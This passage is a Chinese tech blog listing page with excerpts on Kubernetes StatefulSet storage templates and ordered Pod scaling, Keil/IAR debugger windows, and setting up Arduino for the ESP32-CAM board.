StatefulSet职责是管理有状态应用，所以它管理的每个Pod都要自已的专有存储卷，它的存储卷就不能再用Pod模板来创建。
所以 StatefulSets 需要一种新方式来为管辖的Pod分配存储卷。
就这样VolumeClaimTemplate来了，k8s 给 StatefulSets 设置了VolumeClaimTemplate，也就是卷申请模板。
说了为什么需要它，那么VCT到底是什么呢？
VolumeClaimTemplate：基于静态或动态地PV供给方式为Pod资源提供专有且固定的存储，它会为每个Pod都生成不同的PVC，并且绑定PV，实现每个Pod都有自己独立专用的存储卷。
简单描述一下StatefulSets 对Pod的编排调度过程？ StatefulSets 提供了有序且优雅的部署和扩缩保证。
SS是如何优雅部署和扩缩的呢？
对于包含 N 个 副本的 StatefulSet
当部署 Pod 时，它们是依次创建的，顺序为 `0..N-1`。 当删除 Pod 时，它们是逆序终止的，顺序为 `N-1..0`。 在将缩放操作应用到 Pod 之前，它前面的所有 Pod 必须是 Running 和 Ready 状态。 在 Pod 终止之前，所有的继任者必须完全关闭 创建或扩容过程，以Nginx举例
定义副本数replicas=3 SS会创建3个Pod 分配有序序号 ng-0, ng-1, ng-2 SS严格执行部署或调度顺序，按序部署 ng-0 开始部署... ng-0 进入Running 和 Ready 状态 SS 检测 ng-0 部署状态 确定ng-0，符合Running 和 Ready 状态 ng-1 开始部署 ng-1 进入Running 和 Ready 状态 SS 检测 ng-0 和 ng-1 部署状态 确定ng-0 和 ng-1 都符合Running 和 Ready 状态 才会执行 ng-2 部署 假设此时 ng-0 发生故障 那么ng-2 会阻塞，等待 ng-0 重新部署完成 ng-2 开始部署 ng-2 进入Running 和 Ready 状态 类似，StatefulSet 进行缩容跟扩容整体规则是一样的，只不过缩容时，终止顺序和创建顺序相反。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7421f8deea5ce2175978532e3a93c252/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76161e0bb1ab6aa7bbdb46eba335487b/" rel="bookmark">
			keil及iar调试解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比较常用的功能 Breakpoints：也就是断点
Disassembly：反汇编，也就是你写的程序经过编译烧写之后，在单片机中的样子
Memory：内存，可以查看全部内存中的数据，看起来就像一般的16进制编辑器
Symbolic Memory：符号内存，不但能看到内存数据，还能看出来对应程序中的什么变量
Register：寄存器，查看全部寄存器的内容
Watch：观察，可以根据你的需要，指定查看什么，根据楼主的经验，查看全局变量方便一些，在变量可见范围内，也可以查看局部变量和静态变量（static）
Locals：查看函数局部（变量等）内容，包括函数的参数
Statics：查看静态内存变量，注意不是指静态变量（static），而是生命周期是整个程序生命期的变量，原则上不在堆栈中的局部变量，应该都是静态内存变量。
auto：自动，指的不是C语言中的自动变量，而是指根据指令指针当前的位置，自动显示出相关的变量
Call Stack：调用栈，表示到当前位置的函数调用顺序图
Stack：栈，就是栈的数据表示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7df2a6c79aa2aea6a3de31cfc06b02e/" rel="bookmark">
			ESP32-CAM搭建Arduino及简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		准备 需要一个ESP32-CAM模块，我买的是这种，下面带了个下载模块的，接上USB就能用了，很方便，如果没有买下面那个那就得自行用USB-TTL了
配置环境 有了硬件，下面就是软件的事情了，Arduino IDE本身没有ESP32或ESP8266的开发板，所以需要自己去安装
方法一 用Arduino IDE进行安装
打开Arduino IDE，找到文件 → 首选项，然后把下面两个链接加上去
http://wechat.doit.am/package_esp8266com_index.jsonhttps://dl.espressif.com/dl/package_esp32_index.json（这一个就行） 如图所示
然后找到：工具 → 开发板 → 开发板管理器，搜索esp32，这个时候就出现了esp32的板子了
安装速度比较慢，等待安装完毕即可
方法二 从github下载并安装
先到乐鑫的github仓库将所有文件打包下载
GitHub - espressif/arduino-esp32: Arduino core for the ESP32
到自己的Arduino安装目录下，找到hardware文件夹，建立文件夹espressif，然后在里面再建立一个esp32文件夹
然后把刚刚github下载的文件解压到Arduino安装目录/hardware/espressif/esp32/下
确保自己电脑上有python环境，运行get.exe即可
很慢，耐心等待
程序 到这里我们就有了ESP32的开发环境了，开始烧写代码
在 工具 → 开发板 可以看到有ESP32的相关板子了，用ESP32 Dev Module或者 ESP32 Wrover Module都可以
然后打开ESP32-CAM的例程
打开后，找到前面一堆#define，把默认的摄像头模块注释掉，解开#define CAMERA_MODEL_AI_THINKER的注释
//#define CAMERA_MODEL_M5STACK_WIDE // Has PSRAM//#define CAMERA_MODEL_M5STACK_ESP32CAM // No PSRAM#define CAMERA_MODEL_AI_THINKER // Has PSRAM//#define CAMERA_MODEL_TTGO_T_JOURNAL // No PSRAM 然后找到ssid和password输入自己的Wifi名称和密码，就可以尝试编译上传了
const char* ssid = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7df2a6c79aa2aea6a3de31cfc06b02e/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/152/">«</a>
	<span class="pagination__item pagination__item--current">153/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/154/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>